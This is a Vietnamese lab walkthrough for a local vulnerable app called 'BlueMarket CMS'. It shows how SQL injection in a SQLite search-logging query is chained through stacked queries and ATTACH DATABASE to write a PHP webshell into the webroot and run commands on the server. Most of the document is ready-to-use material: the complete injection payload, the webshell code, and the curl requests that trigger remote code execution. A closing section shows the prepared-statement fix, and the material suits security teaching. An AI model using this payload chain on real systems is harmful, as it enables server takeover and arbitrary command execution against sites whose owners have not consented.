# Hướng 1: SQLite ATTACH DATABASE -> Webshell -> RCE

> Chỉ sử dụng trong lab local `BlueMarket CMS`. Không dùng payload này trên hệ thống không được phép.

## 1. Vị trí lỗi trong app

Chức năng người dùng nhìn thấy:

```text
Product Search
Route: /search?q=...
```

File xử lý:

```text
app/src/Services/SqliteCacheService.php
```

Đoạn code vulnerable:

```php
$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
$this->pdo->exec($sql);
```

Ý tưởng:

```text
User input q
-> được nối trực tiếp vào câu INSERT của SQLite
-> attacker đóng chuỗi keyword
-> thêm stacked query
-> dùng ATTACH DATABASE để tạo file trong webroot
-> chèn PHP code vào file đó
-> gọi file qua browser
-> PHP-FPM thực thi lệnh
```

## 2. Kiểm tra lab đang chạy

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
docker compose ps
```

Mở search bình thường:

```powershell
curl.exe "http://localhost:5000/search?q=dock"
```

Kỳ vọng: trang search trả về kết quả sản phẩm và analytics cache ghi keyword `dock`.

## 3. Thử SQLi cơ bản

Payload thử lỗi đầu tiên:

```text
'
```

Gửi request:

```powershell
curl.exe -G --data-urlencode "q='" http://localhost:5000/search
```

Nếu app đang ở `APP_MODE=vulnerable`, bạn sẽ thấy lỗi SQLite vì câu SQL bị vỡ:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES (''', datetime('now'))
```

Giải thích:

```text
Dấu ' của attacker làm chuỗi SQL bị sai cú pháp
-> SQLite báo lỗi syntax
-> chứng minh input q đang đi vào SQL parser
```

## 4. Thử stacked query an toàn

Mục tiêu bước này là chứng minh có thể chèn thêm câu SQL sau câu `INSERT`.

Payload:

```sql
x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
```

Gửi request:

```powershell
$payload = @'
x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
'@

curl.exe -G --data-urlencode "q=$payload" http://localhost:5000/search
```

Câu SQL sau khi ghép sẽ có dạng:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES ('x', datetime('now'));
INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now'));
--', datetime('now'))
```

Kiểm tra trên giao diện:

```text
Mở /search
-> nhìn khung Analytics Cache
-> nếu thấy keyword sqli_stacked_ok thì stacked query đã chạy
```

## 5. Xây dựng payload ghi webshell từng phần

### 5.1. Đóng câu INSERT gốc

Câu gốc:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES ('<q>', datetime('now'))
```

Ta cần biến `<q>` thành:

```sql
x', datetime('now'));
```

Kết quả:

```sql
INSERT INTO search_logs(keyword, created_at) VALUES ('x', datetime('now'));
```

### 5.2. ATTACH DATABASE

Mục tiêu là tạo file PHP trong webroot:

```text
/var/www/html/public/uploads/cache.php
```

SQL:

```sql
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
```

Giải thích:

```text
SQLite sẽ tạo file cache.php như một SQLite database mới.
Vì file nằm trong public/uploads và Nginx cho PHP-FPM xử lý .php, file này có thể được gọi qua browser.
```

### 5.3. Tạo bảng trong attached database

```sql
CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
```

Giải thích:

```text
Bảng payload được tạo trong database alias shell.
Vì shell trỏ tới cache.php, schema/table data sẽ được ghi vào file cache.php.
```

### 5.4. Chèn PHP code

PHP code cần chèn:

```php
<?php system($_GET['cmd'] ?? 'id'); ?>
```

SQL:

```sql
INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
```

Giải thích:

```text
Trong chuỗi SQL, dấu ' bên trong PHP phải được escape thành '' để không làm vỡ câu INSERT.
Khi gọi /uploads/cache.php?cmd=pwd, PHP parser sẽ bỏ qua byte không nằm trong <?php ... ?>.
Đến đoạn PHP code, hàm system() sẽ chạy tham số cmd.
```

### 5.5. Comment phần SQL còn lại

```sql
--
```

Giải thích:

```text
Comment phần đuôi còn lại của câu SQL gốc: ', datetime('now'))
```

## 6. Payload hoàn chỉnh

Nếu file cũ đã tồn tại, xóa trước:

```powershell
Remove-Item -Force .\app\public\uploads\cache.php -ErrorAction SilentlyContinue
```

Gửi payload:

```powershell
$payload = @'
x', datetime('now')); ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell; CREATE TABLE IF NOT EXISTS shell.payload (code TEXT); DELETE FROM shell.payload; INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>'); --
'@

curl.exe -G --data-urlencode "q=$payload" http://localhost:5000/search
```

## 7. Kích hoạt RCE

Chạy lệnh `pwd`:

```powershell
curl.exe "http://localhost:5000/uploads/cache.php?cmd=pwd"
```

Chạy lệnh `id`:

```powershell
curl.exe "http://localhost:5000/uploads/cache.php?cmd=id"
```

Chạy lệnh `whoami`:

```powershell
curl.exe "http://localhost:5000/uploads/cache.php?cmd=whoami"
```

Kết quả có thể có dữ liệu SQLite ở đầu file:

```text
SQLite format 3...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Phần cần chụp làm minh chứng là output của lệnh, ví dụ `/var/www/html/public/uploads`.

## 8. Cleanup

```powershell
Remove-Item -Force .\app\public\uploads\cache.php -ErrorAction SilentlyContinue
```

## 9. Điều kiện để thành công

```text
1. APP_MODE=vulnerable.
2. SQLite exec() chấp nhận stacked query.
3. Process web ghi được vào /var/www/html/public/uploads.
4. Nginx/PHP-FPM xử lý file .php trong uploads.
5. Payload có đoạn <?php ... ?> hợp lệ.
```

## 10. Fixed mode chặn ở đâu

Trong fixed mode, `SqliteCacheService.php` dùng prepared statement:

```php
$stmt = $this->pdo->prepare('INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))');
$stmt->execute(['keyword' => $keyword]);
```

Lúc này payload chỉ là dữ liệu keyword, không còn là cú pháp SQL.


